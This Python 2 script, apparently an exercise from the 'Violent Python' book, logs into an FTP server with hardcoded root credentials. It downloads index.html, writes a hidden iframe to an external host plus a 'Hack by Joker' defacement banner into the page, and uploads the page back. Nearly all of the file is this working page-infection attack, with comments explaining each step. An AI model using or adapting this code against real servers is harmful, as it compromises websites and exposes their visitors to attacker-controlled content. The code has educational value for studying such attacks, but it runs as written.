# _*_coding:utf8-
import ftplib
from Violent_Python import  _Config
'''
This code, we need learning how to upload file or download file with target FTP.
Note:Make sure your "write enable equal YES" in your /etc/vsftpd.conf
Document:
---------
    1. we logon target FTP, and use ftp.retrlines(cmd,callback) function download target file,
        this example we download index.html(of course,you need have index.html in your "FTP user" directory)
    2.and second, we write "redirect code" in index.html
    3.upload file in target "FTP server"
    4.retrlines(self, cmd, callback=None)::Retrieve data in line mode
                                            using cmd search and download if succeeded
                                            
                                            
    5.storlines(self, cmd, fp)::Store a file in line mode. the second parameter is file path,
                                upload file and content is  file parameter fp
                                            
Note:
----
    you can view injectPage function code,but I recommend injectPage2 function.
    because,injectPage2's logic will be more clear!
   
        
'''
def injectPage(ftp,page,redirect):
    '''
    Using parameter "callback" to write download file
    :param ftp:
    :param page: target page
    :param redirect: redirect page
    :return:
    '''
    f = open(page + '.tmp','w')
    ftp.retrlines('RETR ' + page,f.write)
    print '[+] Downloaded Page: ' + page
    f.write(redirect)
    f.close()
    print '[+] Injected Malicious IFrame on: ' + page
    ftp.storlines('STOR ' + page,open(page + '.tmp'))
    print '[+] Uploaded Injected Page: ' + page


def injectPage2(ftp,page,redirect):
    # Download page
    ftp.retrlines('RETR ' + page)
    print '[+] Downloaded Page: ' + page
    # write redirect code
    f = open(page,'w')
    f.write(redirect)
    f.close()

    # upload files
    print '[+] Injected Malicious IFrame on: ' + page
    ftp.storlines('STOR ' + page,open(page))
    print '[+] Uploaded Injected Page: ' + page




if __name__ == '__main__':

    host = '127.0.0.1'
    userName = 'root'
    passWord = 'toor'
    ftp = ftplib.FTP(host)
    ftp.login(userName,passWord)
    redirect = '<iframe src = "http://{}/"></iframe><h1>Hack by Joker</h1>'.format(_Config.Ali['host'])
    injectPage2(ftp,'index.html',redirect)